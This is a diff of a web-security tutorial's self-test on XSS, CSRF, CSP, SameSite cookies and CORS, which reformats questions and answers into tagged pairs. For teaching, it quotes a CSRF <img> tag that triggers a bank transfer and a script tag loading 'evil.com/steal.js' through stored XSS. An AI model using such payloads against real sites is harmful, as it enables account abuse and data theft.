@@ -397,10 +397,27 @@ Set-Cookie: session=abc123;
 
 ### Self-test: 5 questions
 
+<Question>
 **Q1.** What is the difference between stored XSS and DOM-based XSS in terms of where the fix must be applied?
+</Question>
 
+<Answer>
+Stored XSS originates from the server rendering unsanitized data from the database. The fix is server-side: escape HTML before rendering user-supplied content into the page. DOM-based XSS is entirely client-side. The server sends a safe response, but client-side JS reads from a tainted source like `location.hash` and writes it to the DOM unsafely using `innerHTML` or similar sinks. Server-side escaping has no effect on DOM XSS. The fix must be client-side: use `textContent` instead of `innerHTML`, or sanitize with a trusted library before any DOM write.
+</Answer>
+
+---
+
+<Question>
 **Q2.** A bank's transfer endpoint uses `GET`: `/transfer?amount=1000&to=attacker`. An attacker embeds `<img src="https://bank.com/transfer?amount=1000&to=attacker">` on their page. The victim visits the page while logged into bank.com. What happens and why?
+</Question>
 
+<Answer>
+The transfer executes. The browser loads the `<img>` tag, fires a `GET` request to `bank.com/transfer`, and automatically attaches the session cookie. Bank.com receives a valid authenticated request and processes the transfer. The attacker never sees the response, but the damage is done server-side. This illustrates why state-changing operations must never use `GET`, and why `SameSite=Lax` alone would not protect here since `Lax` allows cookies on cross-site GET navigations. The fix is to use `POST` for transfers and add CSRF token validation.
+</Answer>
+
+---
+
+<Question>
 **Q3.** A site has this CSP header:
 
 ```
@@ -408,24 +425,28 @@ Content-Security-Policy: script-src 'self'
 ```
 
 An attacker injects `<script src="https://evil.com/steal.js"></script>` via a stored XSS vulnerability. Does the script execute?
+</Question>
 
-**Q4.** What is the practical difference between `SameSite=Strict` and `SameSite=Lax` for a logged-in user clicking a link from an email to a banking site?
-
-**Q5.** An API uses only CORS headers to restrict access to `https://app.com`. Does this prevent CSRF attacks from `https://evil.com`? Why or why not?
+<Answer>
+No. The CSP `script-src 'self'` only allows scripts from the same origin. `https://evil.com/steal.js` is a different origin. The browser blocks the script before it executes and logs a CSP violation. This demonstrates CSP's core value: even when an XSS injection succeeds in getting a `<script>` tag into the page, CSP prevents execution. The attacker's injection is neutered at the browser level.
+</Answer>
 
 ---
 
-<details>
-<summary>Answers</summary>
+<Question>
+**Q4.** What is the practical difference between `SameSite=Strict` and `SameSite=Lax` for a logged-in user clicking a link from an email to a banking site?
+</Question>
 
-**A1.** Stored XSS originates from the server rendering unsanitized data from the database. The fix is server-side: escape HTML before rendering user-supplied content into the page. DOM-based XSS is entirely client-side. The server sends a safe response, but client-side JS reads from a tainted source like `location.hash` and writes it to the DOM unsafely using `innerHTML` or similar sinks. Server-side escaping has no effect on DOM XSS. The fix must be client-side: use `textContent` instead of `innerHTML`, or sanitize with a trusted library before any DOM write.
+<Answer>
+With `SameSite=Strict`, clicking a link in an email to `bank.com` is a cross-site navigation. The session cookie is not sent. The user arrives at bank.com as if logged out, forced to log in again. With `SameSite=Lax`, the same click is a top-level GET navigation. The session cookie is sent and the user arrives logged in. `Lax` provides nearly the same CSRF protection (blocks cross-site `POST`, `iframe` loads, image loads) while preserving the normal navigation experience. This is why `Lax` is the pragmatic default in most modern frameworks.
+</Answer>
 
-**A2.** The transfer executes. The browser loads the `<img>` tag, fires a `GET` request to `bank.com/transfer`, and automatically attaches the session cookie. Bank.com receives a valid authenticated request and processes the transfer. The attacker never sees the response, but the damage is done server-side. This illustrates why state-changing operations must never use `GET`, and why `SameSite=Lax` alone would not protect here since `Lax` allows cookies on cross-site GET navigations. The fix is to use `POST` for transfers and add CSRF token validation.
+---
 
-**A3.** No. The CSP `script-src 'self'` only allows scripts from the same origin. `https://evil.com/steal.js` is a different origin. The browser blocks the script before it executes and logs a CSP violation. This demonstrates CSP's core value: even when an XSS injection succeeds in getting a `<script>` tag into the page, CSP prevents execution. The attacker's injection is neutered at the browser level.
+<Question>
+**Q5.** An API uses only CORS headers to restrict access to `https://app.com`. Does this prevent CSRF attacks from `https://evil.com`? Why or why not?
+</Question>
 
-**A4.** With `SameSite=Strict`, clicking a link in an email to `bank.com` is a cross-site navigation. The session cookie is not sent. The user arrives at bank.com as if logged out, forced to log in again. With `SameSite=Lax`, the same click is a top-level GET navigation. The session cookie is sent and the user arrives logged in. `Lax` provides nearly the same CSRF protection (blocks cross-site `POST`, `iframe` loads, image loads) while preserving the normal navigation experience. This is why `Lax` is the pragmatic default in most modern frameworks.
-
-**A5.** No, CORS does not prevent CSRF. CORS is a browser mechanism that controls whether JavaScript on a cross-origin page can read the response. It does not prevent the request from being sent. A CSRF attack using a standard HTML form `POST` is a simple request, which goes through without a preflight. The browser sends the request including the victim's cookies. The server processes it. CORS only hides the response from the attacker's JavaScript. The state-changing operation on the server has already happened. CSRF requires its own defenses: CSRF tokens, `SameSite` cookies, or custom headers.
-
-</details>
+<Answer>
+No, CORS does not prevent CSRF. CORS is a browser mechanism that controls whether JavaScript on a cross-origin page can read the response. It does not prevent the request from being sent. A CSRF attack using a standard HTML form `POST` is a simple request, which goes through without a preflight. The browser sends the request including the victim's cookies. The server processes it. CORS only hides the response from the attacker's JavaScript. The state-changing operation on the server has already happened. CSRF requires its own defenses: CSRF tokens, `SameSite` cookies, or custom headers.
+</Answer>
